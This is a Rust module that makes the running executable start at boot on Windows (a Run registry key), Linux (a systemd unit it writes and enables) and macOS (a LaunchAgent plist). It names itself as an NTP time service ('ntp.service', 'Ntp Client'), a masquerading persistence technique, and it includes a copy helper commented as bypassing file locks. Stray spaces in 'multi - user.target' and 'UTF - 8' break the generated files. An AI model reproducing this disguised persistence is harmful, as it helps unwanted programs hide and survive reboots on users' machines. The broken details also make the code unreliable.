use tokio::fs;
#[cfg(target_os = "windows")]
use winreg::enums::*;
#[cfg(target_os = "windows")]
use winreg::RegKey;

#[cfg(target_os = "linux")]
use std::process::Command;

#[cfg(any(target_os = "linux", target_os = "macos"))]
use std::fs::File;
#[cfg(any(target_os = "linux", target_os = "macos"))]
use std::io::Write;

use std::env;
use std::path::PathBuf;

pub async fn run() -> Result<(), Box<dyn std::error::Error>> {
    #[cfg(target_os = "windows")]
    {
        // 获取当前可执行文件的路径
        let current_exe = env::current_exe()?;
        let exe_path = env::current_exe()?;
        let exe_path_str = exe_path
            .to_str()
            .ok_or("Failed to convert path to string")?;

        // 移动 exe to /usr/local/bin
        // let mut dest_path = PathBuf::from(env::var("USERPROFILE")?);
        // dest_path.push("AppData");
        // dest_path.push("Local");
        // dest_path.push("Programs");
        // dest_path.push("Ntp Client");
        // if !dest_path.exists() {
        //     fs::create_dir_all(&dest_path).await?;
        // }
        // dest_path.push(current_exe.file_name().unwrap());

        // let dest_path = dest_path
        //     .to_str()
        //     .ok_or("Failed to convert path to string")?;

        // safe_copy(exe_path_str, &dest_path).await.unwrap();

        // 打开注册表中的开机自启项所在的键
        let hkcu = RegKey::predef(HKEY_CURRENT_USER);
        let run_key = hkcu.open_subkey_with_flags(
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            KEY_SET_VALUE,
        )?;

        // 获取程序的名称
        let program_name = exe_path
            .file_name()
            .ok_or("Failed to get program name")?
            .to_str()
            .ok_or("Failed to convert name to string")?;

        // 在注册表中设置开机自启项
        run_key.set_value(program_name, &exe_path_str)?;

        println!("已将程序设置为开机自动启动");
    }

    #[cfg(target_os = "linux")]
    {
        // 获取当前可执行文件的路径
        let exe_path = env::current_exe()?;
        let exe_path_str = exe_path
            .to_str()
            .ok_or("Failed to convert path to string")?;

        // 定义 Systemd 服务单元文件内容
        let service_content = format!(
            "[Unit]\nDescription=My Rust Program\nAfter=network.target\n\n[Service]\nExecStart={}\nRestart=always\nUser=your_username\nGroup=your_groupname\n\n[Install]\nWantedBy=multi - user.target",
            exe_path_str
        );

        // 定义服务单元文件的路径
        let service_file_path = "/etc/systemd/system/ntp.service";
        let mut service_file = File::create(service_file_path)?;
        service_file.write_all(service_content.as_bytes())?;

        // 重新加载 Systemd 管理器配置
        Command::new("systemctl").arg("daemon-reload").status()?;

        // 启用服务
        Command::new("systemctl")
            .arg("enable")
            .arg("ntp.service")
            .status()?;

        println!("已将程序设置为开机自动启动");
    }

    #[cfg(target_os = "macos")]
    {
        // 获取当前可执行文件的路径
        let exe_path = env::current_exe()?;
        let exe_path_str = exe_path
            .to_str()
            .ok_or("Failed to convert path to string")?;

        // 生成 plist 文件内容
        let plist_content = format!(
            r#"<?xml version="1.0" encoding="UTF - 8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>ntp_service</string>
    <key>ProgramArguments</key>
    <array>
        <string>{}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>"#,
            exe_path_str
        );

        // 定义 plist 文件的路径
        let mut launch_agents_dir = PathBuf::from(env::var("HOME")?);
        launch_agents_dir.push("Library/LaunchAgents");
        let plist_file_path = launch_agents_dir.join("ntp_service.plist");

        // 创建并写入 plist 文件
        let mut plist_file = File::create(plist_file_path)?;
        plist_file.write_all(plist_content.as_bytes())?;

        println!("已将程序设置为开机自动启动");
    }

    Ok(())
}

async fn get_target_dir() -> Result<PathBuf, Box<dyn std::error::Error>> {
    let home_dir = get_user_home()?;

    let target_dir = home_dir.join(".local").join("bin");

    if !target_dir.exists() {
        fs::create_dir_all(&target_dir).await?;
    }

    Ok(target_dir)
}

fn get_user_home() -> Result<PathBuf, Box<dyn std::error::Error>> {
    #[cfg(unix)]
    {
        Ok(PathBuf::from(env::var("HOME")?))
    }
    #[cfg(windows)]
    {
        Ok(PathBuf::from(env::var("USERPROFILE")?))
    }
}

#[cfg(target_os = "windows")]
async fn safe_copy(src: &str, dst: &str) -> Result<(), std::io::Error> {
    use std::fs;
    use std::os::windows::fs::FileExt;
    // 尝试用低权限模式打开文件
    let file = fs::File::open(src)?;

    // 创建目标文件
    let dest_file = fs::File::create(dst)?;

    // 逐段读取写入（绕过文件锁）
    let mut buffer = [0u8; 4096];
    let mut offset = 0;

    loop {
        let read_bytes = file.seek_read(&mut buffer, offset)?;
        if read_bytes == 0 {
            break;
        }
        dest_file.seek_write(&buffer[..read_bytes], offset)?;
        offset += read_bytes as u64;
    }

    Ok(())
}
